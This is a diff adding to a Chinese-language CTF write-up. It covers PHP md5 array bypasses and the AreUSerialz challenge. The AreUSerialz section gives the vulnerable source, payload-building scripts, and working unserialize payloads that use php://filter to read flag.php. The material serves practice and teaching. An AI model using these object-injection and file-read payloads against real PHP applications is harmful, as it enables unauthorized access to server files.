@@ -172,6 +172,8 @@ calc.php? num=print_r(scandir('/'));
 
    而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from 'admin' where password='' or '6xxxxx'，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。
 4.  查看源码，我们发现有一个弱类型比较，也可以数组绕过
+
+   ?a[]=1&b[]=2
 ```php
 <!--
 $a = $GET['a'];
@@ -225,6 +227,8 @@ if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['para
 
    0e940624217856561557816327384675
 7. 在这里我们就用md5无法处理数组，然后都返回null，null=null然后就绕过了这个。
+
+   param1[]=111&param2[]=222
 
 # [ZJCTF 2019]NiZhuanSiWei 1
 
@@ -299,3 +303,210 @@ echo serialize($password);
 ```
 6. 得到`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`
 7. 重新构建payload:`?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}`,得到flag
+
+# [网鼎杯 2020 青龙组]AreUSerialz 1
+
+## 基础知识
+
+>PHP访问修饰符
+
+**public**公共的,任何成员都可以访问
+
+**private**私有的,只有自己可以访问
+
+`绕过方式`:%00类名%00成员名
+
+**protected**保护的,只有当前类的成员与继承该类的类才能访问
+
+`绕过方式`:%00%00成员名
+
+>PHP类
+
+**class**创建类
+
+>PHP关键字
+
+**function**用于用户声明自定义函数
+
+**$this->** 表示在类本身内部使用本类的属性或者方法
+
+**isset**用来检测参数是否存在并且是否具有值
+
+>PHP常见函数
+
+**include()** 包含函数
+
+**highlight_file()** 函数对文件进行语法高亮显示
+
+**file_put_contents()** 函数把一个字符串写入文件中
+
+**file_get_contents()** 函数把整个文件读入一个字符串中
+
+**is_valid()** 检查对象变量是否已经实例化，即实例变量的值是否是个有效的对象
+
+**strlen** 计算字符串长度
+
+**ord** 用于返回 “S” 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串
+
+>PHP魔法函数
+
+**__construct()** 实例化对象时被调用
+
+**__destruct()** 当删除一个对象或对象操作终止时被调用
+
+## WP
+
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {                                                               //满足对象op=2,执行read读的操作
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {                                                                  //满足content<100即可绕过
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {                                      
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {                                              //利用ord函数 返回 “S” 的 ASCII值 s为字符串类型 S为16进制字符串数据类型,绕过方式%00转换为\00即可绕过
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {                                             //GET方式传参,参数是str,将传入的值转为字符串类型,将str参数放入到自定义函数is_valid里面进行反序列化操作
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+?>
+```
+
+### 第一种解法 突破ord函数限制
+
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='flag.php';         
+ //题目中包含flag的文件
+protected $content;
+
+}
+$bai = urlencode(serialize(new FileHandler)); 
+//URL编码实例化后的类FileHandler序列化结果
+$mao =str_replace('%00',"\\00",$bai);    
+//str_replace函数查找变量bai里面的数值%00并将其替换为\\00
+$mao =str_replace('s','S',$mao);         
+//str_replace函数查找变量mao里面的数值s并将其替换为S
+echo $mao                                               
+//打印结果
+?>
+```
+
+序列化结果
+
+O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D
+
+构造payload
+
+?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D
+
+### 第二种解法 突破protected访问修饰符限制
+
+>这个关键点是将受保护的对象转换成公共对象
+
+```php
+<?php
+  class FileHandler {
+  protected $op = 2;
+  protected $filename ='php://filter/read=convert.base64-encode/resource=flag.php';             
+//php://filter伪协议
+protected $content;
+
+}
+$baimao=serialize(new FileHandler());
+//实例化并序列化类FileHandler
+echo $baimao;
+//打印结果
+?>
+```
+
+序列化结果
+
+O:11:"FileHandler":3:{s:5:" * op";i:2;s:11:" * filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:" * content";N;}
+
+删除乱码并减去相应长度
+
+O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
+
+构造payload
+
+?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
+
+回显结果
+
+PD9waHAgJGZsYWc9J2ZsYWd7ZTI4NTdjODItMTliMi00MWE1LTg4MWUtZWNjMGM1ODgzZDVifSc7Cg==
+
+base64解码
+
+得到flag
